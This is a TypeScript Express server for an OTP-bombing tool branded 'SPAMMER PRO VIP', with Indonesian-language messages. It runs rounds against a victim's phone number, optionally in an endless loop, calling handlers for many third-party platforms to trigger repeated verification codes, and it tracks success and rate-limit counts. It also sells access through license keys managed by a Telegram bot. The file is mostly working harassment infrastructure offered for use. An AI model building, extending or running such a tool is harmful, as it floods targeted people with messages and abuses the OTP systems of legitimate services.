import express from 'express';
import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import { fileURLToPath } from 'url';
import { createServer as createViteServer } from 'vite';
import {
  ALL_PLATFORMS,
  evaluateVerdict,
  fmtplus,
  getPublicIp,
  JobState,
  LogEntry,
  normalizePhone,
} from './src/server/otpEngine.ts';
import {
  createLicenseKey,
  getAllKeysForRole,
  loadTelegramConfig,
  MASTER_ADMIN_KEY,
  saveTelegramConfig,
  updateKeyStatus,
  verifyAndLogin,
} from './src/server/licenseStore.ts';
import { AuthSession, UserRole } from './src/types/auth.ts';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = Number(process.env.SERVER_PORT) || Number(process.env.PORT) || 3000;

app.use(express.json());

// In-memory active tokens
const activeSessions: Map<string, AuthSession> = new Map();

function getClientIp(req: express.Request): string {
  const forwarded = req.headers['x-forwarded-for'];
  if (typeof forwarded === 'string') {
    return forwarded.split(',')[0].trim();
  }
  return req.socket.remoteAddress || '127.0.0.1';
}

// Authentication Middleware
function requireAuth(req: express.Request, res: express.Response, next: express.NextFunction) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ success: false, message: 'Unauthorized. Masukkan token login.' });
  }

  const token = authHeader.split(' ')[1];
  const session = activeSessions.get(token);

  if (!session) {
    return res.status(401).json({ success: false, message: 'Sesi login tidak valid atau kadaluarsa.' });
  }

  if (session.expiresAt && Date.now() > session.expiresAt) {
    activeSessions.delete(token);
    return res.status(401).json({ success: false, message: 'Masa aktif license key telah habis.' });
  }

  (req as any).userSession = session;
  next();
}

// Global Job State
let activeTask = false;
let stopRequested = false;

const currentJob: JobState = {
  status: 'idle',
  phone: '',
  phone_fmt: '',
  mode: 'single',
  delay: 60,
  selected_platforms: ALL_PLATFORMS.map((p) => p.id),
  current_round: 0,
  stats: {
    total: 0,
    success: 0,
    limit: 0,
    fail: 0,
  },
  logs: [],
};

const sseClients: express.Response[] = [];

function broadcastEvent(data: any) {
  const payload = `data: ${JSON.stringify(data)}\n\n`;
  for (let i = sseClients.length - 1; i >= 0; i--) {
    const res = sseClients[i];
    try {
      res.write(payload);
    } catch {
      sseClients.splice(i, 1);
    }
  }
}

async function runWorker(phone62: string, mode: 'single' | 'loop' | 'pick', delay: number, chosenIds: number[]) {
  activeTask = true;
  stopRequested = false;

  currentJob.status = 'running';
  currentJob.phone = phone62;
  currentJob.phone_fmt = fmtplus(phone62);
  currentJob.mode = mode;
  currentJob.delay = delay;
  currentJob.selected_platforms = chosenIds;
  currentJob.current_round = 0;
  currentJob.stats = { total: 0, success: 0, limit: 0, fail: 0 };
  currentJob.logs = [];

  broadcastEvent({
    type: 'job_start',
    job: {
      phone_fmt: fmtplus(phone62),
      mode,
      delay,
      total_platforms: chosenIds.length,
    },
  });

  let roundNo = 0;

  try {
    while (!stopRequested) {
      roundNo += 1;
      currentJob.current_round = roundNo;

      const nowStr = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

      broadcastEvent({
        type: 'round_start',
        round: roundNo,
        timestamp: nowStr,
      });

      let roundSuccess = 0;

      for (const idx of chosenIds) {
        if (stopRequested) break;

        const platform = ALL_PLATFORMS.find((p) => p.id === idx);
        if (!platform) continue;

        let result;
        try {
          result = await platform.handler(phone62);
        } catch (err: any) {
          result = { status: 0, text: err?.message || 'Error' };
        }

        const { status: verdictStatus, detail } = evaluateVerdict(result.status, result.text);

        currentJob.stats.total += 1;
        if (verdictStatus === 'SUCCESS') {
          currentJob.stats.success += 1;
          roundSuccess += 1;
        } else if (verdictStatus === 'LIMIT') {
          currentJob.stats.limit += 1;
        } else {
          currentJob.stats.fail += 1;
        }

        const logEntry: LogEntry = {
          id: Math.random().toString(36).substring(2, 9),
          round: roundNo,
          platform_id: idx,
          platform_name: platform.name,
          status: verdictStatus,
          detail,
          timestamp: new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
        };

        currentJob.logs.push(logEntry);
        if (currentJob.logs.length > 500) {
          currentJob.logs.shift();
        }

        broadcastEvent({
          type: 'log',
          entry: logEntry,
          stats: currentJob.stats,
        });

        await new Promise((r) => setTimeout(r, 600));
      }

      broadcastEvent({
        type: 'round_complete',
        round: roundNo,
        round_success: roundSuccess,
        stats: currentJob.stats,
      });

      if (mode !== 'loop' || stopRequested) {
        break;
      }

      // Countdown loop
      for (let elapsed = 0; elapsed < delay; elapsed++) {
        if (stopRequested) break;
        broadcastEvent({
          type: 'countdown',
          remaining: delay - elapsed,
        });
        await new Promise((r) => setTimeout(r, 1000));
      }
    }
  } catch (err: any) {
    broadcastEvent({
      type: 'error',
      message: err?.message || 'Unexpected worker error',
    });
  } finally {
    activeTask = false;
    currentJob.status = stopRequested ? 'stopped' : 'completed';
    broadcastEvent({
      type: 'job_complete',
      status: currentJob.status,
      stats: currentJob.stats,
    });
  }
}

// -------------------------------------------------------------
// AUTH & LICENSE KEY API ENDPOINTS
// -------------------------------------------------------------

// 1. Login with License Key
app.post('/api/auth/login', (req, res) => {
  const { key = '' } = req.body || {};
  if (!key.trim()) {
    return res.status(400).json({ success: false, message: 'Masukkan License Key!' });
  }

  const clientIp = getClientIp(req);
  const result = verifyAndLogin(key, clientIp);

  if (!result.success || !result.keyData) {
    return res.status(401).json({ success: false, message: result.message || 'Key tidak valid.' });
  }

  const token = crypto.randomBytes(32).toString('hex');
  const session: AuthSession = {
    token,
    key: result.keyData.key,
    role: result.keyData.role,
    expiresAt: result.keyData.expiresAt,
    createdAt: Date.now(),
    clientIp,
  };

  activeSessions.set(token, session);

  res.json({
    success: true,
    message: `Login berhasil sebagai ${session.role.toUpperCase()}`,
    session,
  });
});

// 2. Verify Token (Heartbeat check for auto-kick)
app.get('/api/auth/verify', (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.json({ valid: false, message: 'No token' });
  }

  const token = authHeader.split(' ')[1];
  const session = activeSessions.get(token);

  if (!session) {
    return res.json({ valid: false, message: 'Sesi tidak ditemukan.' });
  }

  const clientIp = getClientIp(req);
  const check = verifyAndLogin(session.key, clientIp);

  if (!check.success) {
    activeSessions.delete(token);
    return res.json({ valid: false, message: check.message });
  }

  res.json({ valid: true, session });
});

// 3. Logout
app.post('/api/auth/logout', (req, res) => {
  const authHeader = req.headers.authorization;
  if (authHeader && authHeader.startsWith('Bearer ')) {
    const token = authHeader.split(' ')[1];
    activeSessions.delete(token);
  }
  res.json({ success: true });
});

// 4. Get Keys for Current User's Role
app.get('/api/auth/keys', requireAuth, (req, res) => {
  const session = (req as any).userSession as AuthSession;
  const keys = getAllKeysForRole(session.role, session.key);
  res.json({ success: true, keys });
});

// 5. Generate Key
app.post('/api/auth/keys/generate', requireAuth, (req, res) => {
  const session = (req as any).userSession as AuthSession;
  const { role = 'user', duration = 7, isHours = false, note = '' } = req.body || {};

  const result = createLicenseKey(
    session.role,
    session.key,
    role as UserRole,
    Number(duration),
    Boolean(isHours),
    String(note)
  );

  if (!result.success) {
    return res.status(403).json(result);
  }

  res.json(result);
});

// 6. Manage Key Action (ban, unban, reset_ip, delete, extend)
app.post('/api/auth/keys/action', requireAuth, (req, res) => {
  const session = (req as any).userSession as AuthSession;
  const { targetKey, action, extendDays = 7 } = req.body || {};

  if (!targetKey || !action) {
    return res.status(400).json({ success: false, message: 'Parameter tidak lengkap.' });
  }

  const result = updateKeyStatus(session.role, session.key, targetKey, action, extendDays);
  if (!result.success) {
    return res.status(403).json(result);
  }

  res.json(result);
});

// 7. Telegram Bot Config
app.get('/api/auth/telegram/config', requireAuth, (req, res) => {
  const session = (req as any).userSession as AuthSession;
  if (session.role !== 'admin') {
    return res.status(403).json({ success: false, message: 'Hanya admin yang boleh mengakses.' });
  }
  const config = loadTelegramConfig();
  res.json({ success: true, config });
});

app.post('/api/auth/telegram/config', requireAuth, (req, res) => {
  const session = (req as any).userSession as AuthSession;
  if (session.role !== 'admin') {
    return res.status(403).json({ success: false, message: 'Hanya admin yang boleh mengakses.' });
  }
  const { botToken = '', adminChatId = '', enabled = false } = req.body || {};
  const config = { botToken: botToken.trim(), adminChatId: adminChatId.trim(), enabled: Boolean(enabled) };
  saveTelegramConfig(config);
  restartTelegramPolling();
  res.json({ success: true, config });
});

// -------------------------------------------------------------
// TELEGRAM BOT LONG-POLLING ENGINE
// -------------------------------------------------------------
let telegramPollingInterval: any = null;
let lastUpdateId = 0;

async function pollTelegramBot() {
  const config = loadTelegramConfig();
  if (!config.enabled || !config.botToken) return;

  try {
    const url = `https://api.telegram.org/bot${config.botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
    const res = await fetch(url);
    const data = await res.json();

    if (data.ok && Array.isArray(data.result)) {
      for (const update of data.result) {
        lastUpdateId = update.update_id;
        const msg = update.message;
        if (!msg || !msg.text) continue;

        const chatId = String(msg.chat.id);
        // If adminChatId is specified, verify sender
        if (config.adminChatId && chatId !== config.adminChatId) {
          continue;
        }

        const text = msg.text.trim();
        await handleTelegramCommand(config.botToken, chatId, text);
      }
    }
  } catch (err) {
    // Network or API error
  }
}

async function sendTelegramMessage(token: string, chatId: string, text: string) {
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
      }),
    });
  } catch (err) {
    console.error('[!] Failed to send Telegram message:', err);
  }
}

async function handleTelegramCommand(token: string, chatId: string, rawText: string) {
  const parts = rawText.split(' ');
  const cmd = parts[0].toLowerCase();

  if (cmd === '/start' || cmd === '/help') {
    const reply = `👑 <b>SPAMMER PRO VIP BOT</b>\n\n` +
      `<b>Daftar Perintah:</b>\n` +
      `• <code>/genkey [role] [durasi_hari] [catatan]</code>\n` +
      `  Contoh: <code>/genkey user 7 BudiSantoso</code>\n` +
      `• <code>/cekkey [key]</code> - Cek masa aktif\n` +
      `• <code>/extend [key] [hari]</code> - Tambah durasi\n` +
      `• <code>/resetkey [key]</code> - Reset IP/Device lock\n` +
      `• <code>/bankey [key]</code> - Blokir key`;
    await sendTelegramMessage(token, chatId, reply);
    return;
  }

  if (cmd === '/genkey') {
    const role = (parts[1] || 'user').toLowerCase() as UserRole;
    const dur = Number(parts[2]) || 7;
    const note = parts.slice(3).join(' ') || 'Via Bot Telegram';

    const result = createLicenseKey('admin', 'TELEGRAM_BOT', role, dur, false, note);
    if (result.success && result.key) {
      const expStr = result.key.expiresAt ? new Date(result.key.expiresAt).toLocaleDateString('id-ID') : 'Lifetime';
      const reply = `✅ <b>KEY BERHASIL DIBUAT!</b>\n\n` +
        `🔑 <b>Key:</b> <code>${result.key.key}</code>\n` +
        `👤 <b>Role:</b> <code>${result.key.role.toUpperCase()}</code>\n` +
        `⏳ <b>Masa Aktif:</b> ${dur} Hari (${expStr})\n` +
        `📝 <b>Catatan:</b> ${result.key.note}\n\n` +
        `<i>Format Login: Masukkan key di halaman web spammer</i>`;
      await sendTelegramMessage(token, chatId, reply);
    } else {
      await sendTelegramMessage(token, chatId, `❌ Gagal: ${result.message}`);
    }
    return;
  }

  if (cmd === '/cekkey') {
    const targetKey = parts[1];
    if (!targetKey) {
      await sendTelegramMessage(token, chatId, '⚠️ Masukkan key! Format: <code>/cekkey SPAMMER-XXX</code>');
      return;
    }
    const check = verifyAndLogin(targetKey, '127.0.0.1');
    if (check.keyData) {
      const k = check.keyData;
      const exp = k.expiresAt ? new Date(k.expiresAt).toLocaleString('id-ID') : 'Lifetime';
      const reply = `🔍 <b>INFO LICENSE KEY:</b>\n\n` +
        `🔑 <b>Key:</b> <code>${k.key}</code>\n` +
        `👤 <b>Role:</b> <code>${k.role.toUpperCase()}</code>\n` +
        `📊 <b>Status:</b> ${k.isBanned ? '❌ BANNED' : '✅ AKTIF'}\n` +
        `⏳ <b>Expires:</b> ${exp}\n` +
        `📱 <b>Bound IP:</b> ${k.boundIp || 'Belum Login'}\n` +
        `📝 <b>Note:</b> ${k.note || '-'}`;
      await sendTelegramMessage(token, chatId, reply);
    } else {
      await sendTelegramMessage(token, chatId, `❌ Key tidak ditemukan / ${check.message}`);
    }
    return;
  }

  if (cmd === '/extend') {
    const targetKey = parts[1];
    const days = Number(parts[2]) || 7;
    const res = updateKeyStatus('admin', 'TELEGRAM_BOT', targetKey, 'extend', days);
    await sendTelegramMessage(token, chatId, res.success ? `✅ Key ${targetKey} diperpanjang +${days} hari.` : `❌ ${res.message}`);
    return;
  }

  if (cmd === '/resetkey') {
    const targetKey = parts[1];
    const res = updateKeyStatus('admin', 'TELEGRAM_BOT', targetKey, 'reset_ip');
    await sendTelegramMessage(token, chatId, res.success ? `✅ Device lock untuk key ${targetKey} berhasil di-reset.` : `❌ ${res.message}`);
    return;
  }

  if (cmd === '/bankey') {
    const targetKey = parts[1];
    const res = updateKeyStatus('admin', 'TELEGRAM_BOT', targetKey, 'ban');
    await sendTelegramMessage(token, chatId, res.success ? `🚫 Key ${targetKey} berhasil di-BANNED.` : `❌ ${res.message}`);
    return;
  }
}

function restartTelegramPolling() {
  if (telegramPollingInterval) {
    clearInterval(telegramPollingInterval);
    telegramPollingInterval = null;
  }
  const config = loadTelegramConfig();
  if (config.enabled && config.botToken) {
    telegramPollingInterval = setInterval(pollTelegramBot, 3500);
  }
}

// -------------------------------------------------------------
// OTP ENGINE REST APIS
// -------------------------------------------------------------

app.get('/api/info', async (req, res) => {
  const platformsMeta = ALL_PLATFORMS.map((p) => ({
    id: p.id,
    name: p.name,
    category: p.category,
  }));

  res.json({
    platforms: platformsMeta,
    active: activeTask,
    job_status: currentJob.status,
    job: currentJob,
  });
});

app.post('/api/spam/start', (req, res) => {
  if (activeTask) {
    return res.status(400).json({ success: false, message: 'Proses sedang berjalan!' });
  }

  const { phone = '', mode = 'single', delay = 60, platforms = [] } = req.body || {};
  const p62 = normalizePhone(phone);
  if (!p62) {
    return res.status(400).json({
      success: false,
      message: 'Format nomor telepon tidak valid. Gunakan 08xx / 62xx / +62xx',
    });
  }

  const validDelay = Math.max(5, Number(delay) || 60);

  let chosenIds: number[] = [];
  if (Array.isArray(platforms) && platforms.length > 0) {
    chosenIds = platforms.map(Number).filter((id) => ALL_PLATFORMS.some((p) => p.id === id));
  }
  if (chosenIds.length === 0) {
    chosenIds = ALL_PLATFORMS.map((p) => p.id);
  }

  runWorker(p62, mode as any, validDelay, chosenIds);

  res.json({
    success: true,
    message: `Proses dimulai ke ${fmtplus(p62)}`,
    target: fmtplus(p62),
    mode,
    platforms_count: chosenIds.length,
  });
});

app.post('/api/spam/stop', (req, res) => {
  if (!activeTask) {
    return res.status(400).json({ success: false, message: 'Tidak ada proses yang sedang berjalan.' });
  }
  stopRequested = true;
  res.json({ success: true, message: 'Sinyal pemberhentian telah dikirim!' });
});

app.get('/api/spam/stream', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.flushHeaders();

  const initPayload = JSON.stringify({ type: 'init', job: currentJob, active: activeTask });
  res.write(`data: ${initPayload}\n\n`);

  sseClients.push(res);

  req.on('close', () => {
    const idx = sseClients.indexOf(res);
    if (idx !== -1) {
      sseClients.splice(idx, 1);
    }
  });
});

// Vite middleware & Production static serving
async function setupServer() {
  if (process.env.NODE_ENV === 'production') {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  } else {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  }

  restartTelegramPolling();

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[+] SPAMMER PRO VIP Server running at http://0.0.0.0:${PORT}`);
  });
}

setupServer();
